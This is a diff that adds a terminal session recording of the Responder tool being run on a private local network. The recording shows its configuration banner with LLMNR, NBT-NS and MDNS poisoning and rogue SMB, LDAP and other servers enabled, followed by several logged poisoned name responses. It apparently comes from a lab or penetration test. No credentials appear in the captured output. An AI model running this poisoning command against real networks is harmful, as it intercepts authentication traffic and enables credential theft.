@@ -1,0 +1,71 @@
+Script started on 2024-04-12 03:27:26-04:00 [COMMAND="sudo responder -I eth0 -Pv" TERM="xterm-256color" TTY="/dev/pts/3" COLUMNS="241" LINES="51"]
+
+[1;32m[+] [0mPoisoners:
+    LLMNR                      [1;32m[ON][0m
+    NBT-NS                     [1;32m[ON][0m
+    MDNS                       [1;32m[ON][0m
+    DNS                        [1;32m[ON][0m
+    DHCP                       [1;31m[OFF][0m
+
+[1;32m[+] [0mServers:
+    HTTP server                [1;32m[ON][0m
+    HTTPS server               [1;32m[ON][0m
+    WPAD proxy                 [1;31m[OFF][0m
+    Auth proxy                 [1;32m[ON][0m
+    SMB server                 [1;32m[ON][0m
+    Kerberos server            [1;32m[ON][0m
+    SQL server                 [1;32m[ON][0m
+    FTP server                 [1;32m[ON][0m
+    IMAP server                [1;32m[ON][0m
+    POP3 server                [1;32m[ON][0m
+    SMTP server                [1;32m[ON][0m
+    DNS server                 [1;32m[ON][0m
+    LDAP server                [1;32m[ON][0m
+    MQTT server                [1;32m[ON][0m
+    RDP server                 [1;32m[ON][0m
+    DCE-RPC server             [1;32m[ON][0m
+    WinRM server               [1;32m[ON][0m
+    SNMP server                [1;31m[OFF][0m
+
+[1;32m[+] [0mHTTP Options:
+    Always serving EXE         [1;31m[OFF][0m
+    Serving EXE                [1;31m[OFF][0m
+    Serving HTML               [1;31m[OFF][0m
+    Upstream Proxy             [1;31m[OFF][0m
+
+[1;32m[+] [0mPoisoning Options:
+    Analyze Mode               [1;31m[OFF][0m
+    Force WPAD auth            [1;31m[OFF][0m
+    Force Basic Auth           [1;31m[OFF][0m
+    Force LM downgrade         [1;31m[OFF][0m
+    Force ESS downgrade        [1;31m[OFF][0m
+
+[1;32m[+] [0mGeneric Options:
+    Responder NIC              [1;35m[eth0][0m
+    Responder IP               [1;35m[192.168.15.147][0m
+    Responder IPv6             [1;35m[fe80::fcfc:9003:91d8:1fca][0m
+    Challenge set              [1;35m[random][0m
+    Don't Respond To Names     [1;35m['ISATAP', 'ISATAP.LOCAL'][0m
+
+[1;32m[+] [0mCurrent Session Variables:
+    Responder Machine Name     [1;35m[WIN-959KTP4CYTR][0m
+    Responder Domain Name      [1;35m[37WU.LOCAL][0m
+    Responder DCE-RPC Port     [1;35m[49722][0m
+[1;32m
+[+][0m Listening for events...
+
+[1;32m[*] [MDNS] Poisoned answer sent to 192.168.15.144  for name AD-DOMAIN-CONTR.local[0m
+[1;32m[*] [LLMNR]  Poisoned answer sent to fe80::6447:ae99:ce1f:bf54 for name AD-DOMAIN-CONTR[0m
+[1;32m[*] [MDNS] Poisoned answer sent to fe80::6447:ae99:ce1f:bf54 for name AD-DOMAIN-CONTR.local[0m
+[1;32m[*] [LLMNR]  Poisoned answer sent to fe80::6447:ae99:ce1f:bf54 for name AD-DOMAIN-CONTR[0m
+[1;32m[*] [MDNS] Poisoned answer sent to 192.168.15.144  for name AD-DOMAIN-CONTR.local[0m
+[1;32m[*] [LLMNR]  Poisoned answer sent to 192.168.15.144 for name AD-DOMAIN-CONTR[0m
+[1;32m[*] [LLMNR]  Poisoned answer sent to 192.168.15.144 for name AD-DOMAIN-CONTR[0m
+[1;32m[*] [MDNS] Poisoned answer sent to fe80::6447:ae99:ce1f:bf54 for name AD-DOMAIN-CONTR.local[0m
+[1;32m[*] [MDNS] Poisoned answer sent to fe80::273e:5593:4948:da04 for name DEATH.local[0m
+[1;32m[*] [MDNS] Poisoned answer sent to 192.168.15.1    for name DEATH.local[0m
+[1;32m[*] [MDNS] Poisoned answer sent to 192.168.15.1    for name DEATH.local[0m
+[1;32m[*] [MDNS] Poisoned answer sent to fe80::273e:5593:4948:da04 for name DEATH.local[0m
+^C[1;32m[+][0m Exiting...
+
+Script done on 2024-04-12 03:30:03-04:00 [COMMAND_EXIT_CODE="1"]
